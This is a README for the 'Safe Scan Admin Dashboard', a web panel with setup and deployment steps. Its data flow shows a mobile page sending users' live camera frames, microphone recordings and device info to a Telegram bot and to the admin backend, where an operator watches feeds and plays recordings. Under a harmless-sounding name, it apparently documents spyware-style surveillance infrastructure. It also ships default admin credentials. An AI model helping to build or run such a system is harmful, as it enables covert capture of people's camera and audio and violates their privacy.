# Safe Scan Admin Dashboard

Premium admin dashboard for monitoring Safe Scan user activity, live camera feeds, and microphone recordings.

## Architecture

- **Frontend**: Next.js 14 + Tailwind CSS + Framer Motion (Port 3000)
- **Backend**: Express.js + Prisma ORM + Socket.io (Port 3001)
- **Database**: PostgreSQL
- **Real-time**: Socket.io for live camera feeds and audio notifications
- **Auth**: JWT with bcrypt password hashing

## Prerequisites

- Node.js 18+ ([Download](https://nodejs.org/))
- PostgreSQL 14+ ([Download](https://www.postgresql.org/download/))

## Quick Start

### 1. Setup Database

```bash
# Create a PostgreSQL database
createdb safescan

# Or using psql:
psql -U postgres
CREATE DATABASE safescan;
\q
```

### 2. Setup Backend

```bash
cd admin/backend

# Copy environment file and edit DATABASE_URL
cp .env.example .env
# Edit .env with your PostgreSQL credentials

# Install dependencies
npm install

# Generate Prisma client and push schema
npx prisma generate
npx prisma db push

# Seed database with admin user and sample data
npm run seed

# Start development server
npm run dev
```

The backend will start at `http://localhost:3001`

### 3. Setup Frontend

```bash
cd admin/frontend

# Install dependencies
npm install

# Start development server
npm run dev
```

The dashboard will open at `http://localhost:3000`

### 4. Login

- **Username**: `admin`
- **Password**: `admin123`

## Features

### Live Feed Dashboard
- Real-time camera feed grid from all connected users
- Configurable grid layouts (2×2, 3×3, 4×4)
- Online/offline status indicators
- Live frame updates via Socket.io

### Audio Recordings
- Browse all microphone recordings
- Inline audio player with progress bar
- Filter by user

### User Management
- Search and filter users
- View user details, captures, and recordings
- Delete users and their data

### Admin Settings
- Update admin profile (name, email)
- Change password

## Data Flow

```
Mobile App (index.html)
  ├── Camera frames → Telegram Bot API ✅
  ├── Camera frames → Admin Backend (WebSocket) ✅
  ├── Audio recordings → Telegram Bot API ✅
  ├── Audio recordings → Admin Backend (WebSocket) ✅
  └── Device info → Telegram Bot API ✅

Admin Backend (Express.js)
  ├── Stores camera frames as JPEG files → media/captures/
  ├── Stores audio recordings as WebM files → media/recordings/
  ├── Records metadata in PostgreSQL
  └── Relays live frames to Admin Dashboard via Socket.io

Admin Dashboard (Next.js)
  ├── Displays live camera feed grid
  ├── Plays audio recordings
  └── Shows user management + analytics
```

## Environment Variables

### Backend (.env)

| Variable | Default | Description |
|----------|---------|-------------|
| DATABASE_URL | postgresql://postgres:password@localhost:5432/safescan | PostgreSQL connection |
| JWT_SECRET | safescan-admin-secret-key-change-in-production | JWT signing secret |
| PORT | 3001 | Server port |
| CORS_ORIGIN | http://localhost:3000 | Frontend URL for CORS |

## Production Deployment

### Backend
```bash
cd admin/backend
npm run build
npm start
```

### Frontend
```bash
cd admin/frontend
npm run build
npm start
```

### Using PM2 (Recommended)
```bash
npm install -g pm2
cd admin/backend && pm2 start dist/index.js --name safescan-api
cd admin/frontend && pm2 start npm --name safescan-dashboard -- start
```

## Technology Stack

| Component | Technology |
|-----------|-----------|
| Frontend Framework | Next.js 14 (App Router) |
| UI Styling | Tailwind CSS 3 |
| Animations | Framer Motion |
| Icons | Lucide React |
| Charts | Chart.js + react-chartjs-2 |
| Backend Framework | Express.js |
| Database ORM | Prisma |
| Database | PostgreSQL |
| Authentication | JWT + bcrypt |
| Real-time | Socket.io |
| Language | TypeScript |
